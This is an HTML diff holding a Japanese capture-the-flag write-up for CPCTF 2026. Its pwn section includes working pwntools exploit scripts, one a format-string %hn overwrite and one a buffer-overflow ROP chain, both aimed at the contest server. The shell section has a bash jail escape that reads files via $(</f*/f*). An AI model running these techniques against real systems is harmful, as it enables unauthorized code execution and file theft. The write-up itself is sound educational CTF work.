+		<p>提出: <a href="https://yukicoder.me/submissions/1160543">#1160543 (C++17(gcc12)) No.3505 Sum of Prod of Root - yukicoder</a></p>
+	</details>
+	<details class="unsolved"><summary>Lv.4 | All Distance is Square Number</summary></details>
+	<details class="unsolved"><summary>Lv.4 | OR Mapping</summary></details>
+	<details class="unsolved"><summary>Lv.4 | RangeSum RangeUpdate RangeSqrt</summary></details>
+	<details class="unsolved"><summary>Lv.5 | RPS Eliminations</summary></details>
+	<details class="unsolved"><summary>Lv.5 | Get More Money</summary></details>
+	<h2>Pwn</h2>
+	<details class="solved"><summary>Lv.1 | Killionaire</summary>
+		<div>
+			<p>ターン毎に<code>bet</code>を入力することができ、<code>bet</code>は<code>coin</code>以下である必要がある</p>
+			<p>半分の確率で<code>bet</code>が0~3倍になって<code>coin</code>に足され、</p>
+			<p>半分の確率で<code>bet</code>が-1倍になって<code>coin</code>に足される</p>
+			<p><code>coin</code>を1000以上にしたい。適当に絶対値の大きい負数を<code>bet</code>にすれば半分の確率で<code>coin</code>が1000以上になる</p>
+		</div>
+		<div>
+			<pre><samp> __  __ __ __ __                     __             
+|  |/  |__|  |__|.-----.-----.---.-.|__|.----.-----.
+|     <|  |  |  ||  _  |     |  _  ||  ||   _|  -__|
+|__|\__|__|__|__||_____|__|__|___._||__||__| |_____|
+
+Goal: 1000 coins in 10 rounds
+
+Round 1 | Coins: 1
+Bet: <code>-1000</code>
+Result: SUCCESS (Gain: -350)
+----------------------------------------
+Round 2 | Coins: -349
+Bet: <code>-10000</code>
+Result: SUCCESS (Gain: -17700)
+----------------------------------------
+Round 3 | Coins: -18049
+Bet: <code>-100000</code>
+Result: FAILURE (Lost: -100000)
+Flag: <span class="flag">n3g4t1v3_v41u3_1s_m0re_p0w3rfu1_th4n_p0s1tiv3_va1u3</span></samp></pre>
+		</div>
+		<pre><samp class="flag">n3g4t1v3_v41u3_1s_m0re_p0w3rfu1_th4n_p0s1tiv3_va1u3</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.2 | Buffer Visualizer</summary>
+		<div>
+			<p><code>print_visualizer</code>を見て分かる通り、<code>Task</code>構造体の<code>buffer</code>16バイトと<code>target</code>8バイトは連続しているので、</p>
+			<pre><code>read(0, t.buffer, 32)</code></pre>
+			<p>と16文字以上の入力を受け付けていると<code>target</code>も上書きできてしまう</p>
+		</div>
+		<div>
+			<p><code>target == "ADMIN"</code>にすればフラグが得られるので、入力は<code>1234567890123456ADMIN</code>などとすればいい。</p>
+		</div>
+		<pre><samp class="flag">y0u_4r3_PWN_h4ck3r</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.3 | campaign</summary>
+		<div>
+			<p>入力した文字列<code>name</code>を第一引数にして<code>printf</code>しているので、FSB(Format String Bugs)を起こすことができ、Format String Attack(書式文字列攻撃)が可能</p>
+			<pre><code class="bash">nm campaign</code></pre>
+			<p>で、<code>type</code>のアドレスは<code>0x404050</code>であることがわかる</p>
+		</div>
+		<div>
+			<p>FSBで指定したアドレスの内容を書き換えたいときは、<code>%n</code>を用いる。</p>
+			<p><code>%n</code>は、これまでに出力した文字数を、対応する引数で指定されたアドレスに書き込むという動作をする</p>
+			<p>また、<code>%hn</code>とすれば、これまでに出力した文字数を65536で割ったあまりが2バイト、リトルエンディアンで書き込まれる。（<code>%n</code>で4バイト、<code>%hhn</code>で1バイト書き込むことができる。）</p>
+			<p>対応する引数は、スタックの上からm番目であるなら<code>%m$hhn</code>のように指定できる。</p>
+		</div>
+		<div>
+			<p>また、出力した文字数は、<code>%c</code>を用いて稼ぐことができる。</p>
+			<p>例えば<code>%10c</code>とすれば、第一引数(スタックの上から1番目)の値をcharとして扱い、先頭の空白文字含め<code>10</code>文字出力する事ができる。</p>
+			<p><code>printf("%10c", 'A')</code>は<code>.........A</code>と出力される。(<code>.</code>は空白文字)</p>
+		</div>
+		<div>
+			<p>また、printfの処理時にスタックの上から何番目に<code>name</code>があるのか知りたいときは、<code>%p</code>を複数並べてスタックの中身をそのまま出力すると分かる</p>
+			<pre><code class="bash">./campaign</code></pre>
+			<pre><samp>Hi! You are so lucky, you can get a free VIP membership for a year! Please tell me your name and phone number.
+Name: <code>%p %p %p %p %p %p %p %p %p %p</code>
+Phone: <code>0</code>
+Please confirm your information:
+Name: 0x7fffd3a59100 (nil) (nil) 0x6 (nil) 0x1000000 0x100000 0x7025207025207025 0x2520702520702520 0x2070252070252070
+Phone: 0
+Sorry, we can only give the VIP membership to humans.</samp></pre>
+			<p><code>%8$hn</code>とすれば、<code>name</code>の先頭を指せる</p>
+		</div>
+		<div>
+			<p>これらをもとにpythonコードを書いて実行すると、</p>
+			<pre><code>from pwn import p64, remote # , process
+host = "133.88.122.244"
+port = 32522
+# p = process("./campaign")
+r = remote(host, port)
+
+# uh -> 0x7568                     0x7568 = 30056
+# am -> 0x616d = 0x7568 + 0xEC05   0xEC05 = 60421
+#  n -> 0x006e = 0x616d + 0x9F01   0x9F01 = 40705
+payload = (
+	b"%30056c%13$hn" +  # 13 bytes
+	b"%60421c%14$hn" +  # 26 bytes
+	b"%40705c%15$hn_" + # 40 bytes
+	p64(0x404050) +
+	p64(0x404052) +
+	p64(0x404054)
+)
+
+r.sendlineafter(b"Name: ", payload)
+r.sendlineafter(b"Phone: ", b"0")
+r.interactive()</code></pre>
+			<pre><samp>Congratulations! You can get the VIP membership!
+<span class="flag">b3_c4r3fu1_0f_ph15h1ng_m3s54g3s</span>
+<span class="bash"><code>quit</code></span></samp></pre>
+		</div>
+		<pre><samp class="flag">b3_c4r3fu1_0f_ph15h1ng_m3s54g3s</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.4 | coding agent</summary>
+		<div>
+			<p>とりあえず<a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>でデコンパイルしてみると、バッファオーバーフローを起こせそうなので、<code>gdb</code>で<code>main</code>関数から抜けるときの状態を見る</p>
+			<pre><code class="bash">gdb coding-agent</code></pre>
+			<pre><code class="gdb">r</code></pre>
+			<pre><samp>How can I help you today?
+> <code>AAAAAAA1AAAAAAA2AAAAAAA3AAAAAAA4AAAAAAA5AAAAAAA6AAAAAAA7AAAAAAA8</code>
+Sorry, your weekly limit has been reached. Please try again next week.
+
+Program received signal SIGSEGV, Segmentation fault.</samp></pre>
+			<pre><code class="gdb">p/x $rip</code></pre>
+			<pre><samp>$1 = 0x4015f4</samp></pre>
+			<pre><code class="gdb">x/xg $rsp</code></pre>
+			<pre><samp>0x7fffffffd858: 0x3641414141414141</samp></pre>
+			<p>Ghidraでは<code>0x4015f4</code>はRET命令になっているから、この後リターンアドレスは<code>0x3641414141414141</code>に書き換わる。つまり、スタックの6番目がリターンアドレスに対応していることがわかる</p>
+		</div>
+		<div>
+			<p><code>win</code>関数を見ると、<code>R14 == 0x7a0000006876</code>かつ<code>RBX == 0x3b001d000084000</code>かつ<code>R12 == 0x700002c40</code>である場合にのみフラグが出力されることが分かる</p>
+			<p>これらの値を書き換えられる場所を探すと、いかにも怪しい<code>some_function</code>関数の最後の処理で</p>
+			<pre><code>POP RBX
+POP RBP
+POP R12
+POP R13
+POP R14
+POP R15
+RET</code></pre>
+			<p>とあるから、ここでこれらのレジスタの値をスタックから書き換えることができる</p>
+			<p>最後のRET命令で<code>win</code>関数に飛べばいい</p>
+		</div>
+		<div>
+			<p><code>win</code>関数や<code>some_function</code>関数のアドレスを調べたうえでこれらをもとにpythonコードを書いて実行すると、</p>
+			<pre><code>from pwn import p64, remote # , process
+host = "133.88.122.244"
+port = 30826
+# p = process("./coding-agent")
+r = remote(host, port)
+
+payload = (
+	b"A" * 40 + 
+	p64(0x4013ed) + # some_function
+	p64(0x3b001d000084000) + # rbx
+	p64(0) + # rbp
+	p64(0x700002c40) + # r12
+	p64(0) + # r13
+	p64(0x7a0000006876) + # r14
+	p64(0) + # r15
+	p64(0x4013f8) # win
+)
+
+r.sendlineafter(b"> ", payload)
+r.interactive()</code></pre>
+		</div>
+		<pre><samp class="flag">u53_sc4nf_w17h_s1z3_0f_buFf3r5</samp></pre>
+	</details>
+	<details class="unsolved"><summary>Lv.5 | diary</summary></details>
+	<h2>Shell</h2>
+	<details class="solved"><summary>Lv.1 | ssh</summary>
+		<div>
+			<p>SSHの使い方講座</p>
+			<p>以下のようにbashで入力すればいいです</p>
+			<pre><code class="bash">ssh ssh@133.88.122.244 -p 30581</code>←インスタンスを起動してコピーしてきたやつ</pre>
+			<pre><samp>Are you sure you want to continue connecting (yes/no/[fingerprint])? <code>yes</code></samp></pre>
+			<pre><samp>ssh@133.88.122.244's password: <code>cpctf2026</code></samp>←なお、入力しているパスワードは見えない</pre>
+			<p>ここからは、接続先のbashを操作できる</p>
+			<pre><code class="bash">cat /flag/flag.txt</code></pre>
+			<pre><samp class="flag">w31c0m3_2_c11_w0r1d</samp></pre>
+			<pre><code class="bash">exit</code></pre>
+		</div>
+		<pre><samp class="flag">w31c0m3_2_c11_w0r1d</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.2 | ssh2</summary>
+		<div>
+			<p><code>cat</code>が使えないけど、<code>grep</code>や<code>echo</code>は使える</p>
+			<p><code>grep</code>なら、</p>
+			<pre><code class="bash">grep CPCTF /flag/flag.txt</code></pre>
+			<p><code>echo</code>なら、</p>
+			<pre><code class="bash">echo $(&lt;/flag/flag.txt)</code></pre>
+			<p>などとすれば、それぞれフラグを得ることができる</p>
+		</div>
+		<pre><samp class="flag">8ury_0n35_h34d_1n_7h3_54nd80x</samp></pre>
+	</details>
+	<details class="solved"><summary>Lv.3 | CPCTF jail</summary>
+		<div>
+			<p><code>bash -c [この部分]</code>に、<code>c p t f</code>のいずれかと記号文字のみで構成される10文字以下の文字列を指定できる</p>
+			<p><code>ssh2</code>の<code>echo</code>の方法のように、bashでは<code>$()</code>の括弧の中身が<code>&lt;</code>から始まっていると、それに続くファイルの中身を引数にする</p>
+			<p>（通常では<code>$(command)</code>として用いて、括弧の中身であるcommandを実行した際の出力を引数にする）</p>
+			<p>だから、<code>$(&lt;/flag/flag.txt)</code>を入力できれば、<code>/flag/flag.txt</code>の中身をコマンドとして実行しようとしてエラーメッセージが吐かれるので、フラグを得ることができる</p>
+		</div>
+		<div>
+			<p>しかし、<code>c p t f</code>に含まれない英文字も多くあるので、<code>$(&lt;/flag/flag.txt)</code>のように入力することはできない</p>
+			<p>そこで、unix系に備わっているglob展開を利用する。globでは、<code>*</code>を用いて、<code>/</code>を除く任意の文字列を表すことができる</p>
+			<p><code>f</code>を入力することはできるので、</p>
+			<pre><code class="bash">bash -c $(&lt;/f*/f*)</code></pre>
+			<p>で<code>/flag/flag.txt</code>を実行しようとできる</p>
+		</div>
+		<div>
+			<pre><samp>&gt; <code>$(&lt;/f*/f*)</code>
+/bin/bash: line 1: <span class="flag">Y0ur3_4_7ru3_CPCTF_l0v3r</span>: command not found</samp></pre>
+		</div>
+		<pre><samp class="flag">Y0ur3_4_7ru3_CPCTF_l0v3r</samp></pre>
+	</details>
+	<h2>Web</h2>
+	<details class="solved"><summary>Lv.1 | mirage</summary>
+		<div>
+			<p><code>CPCTF</code>で始まる文字列をコピペしたら、全く異なる文字列になっていた</p>
+			<p>開発者ツールで見てみると、全体に<code>mirage</code>というフォントが適用されていて、これが見た目上の文字列を改変していたみたい</p>
+			<p><code>font-family</code>のチェックを外せば、他の場所が正しいフラグであることが分かった</p>
+		</div>
+		<pre><samp class="flag">CH4R4C73R5_4L50_D159U153</samp></pre>
+	</details>
+	<h6>つかれちゃいました。。</h6>
+	<details><summary>Lv.2 | Hidden Recipe</summary></details>
+	<details><summary>Lv.2 | Let's remove script tag</summary></details>
+	<details><summary>Lv.2 | Z</summary></details>
+	<details><summary>Lv.2 | Z</summary></details>
+	<details><summary>Lv.3 | tar me</summary></details>
+	<details><summary>Lv.4 | CPCTF Market</summary></details>
+	<details><summary>Lv.4 | Template Playground</summary></details>
+	<details><summary>Lv.5 | Physical CTF</summary></details>
+</html>
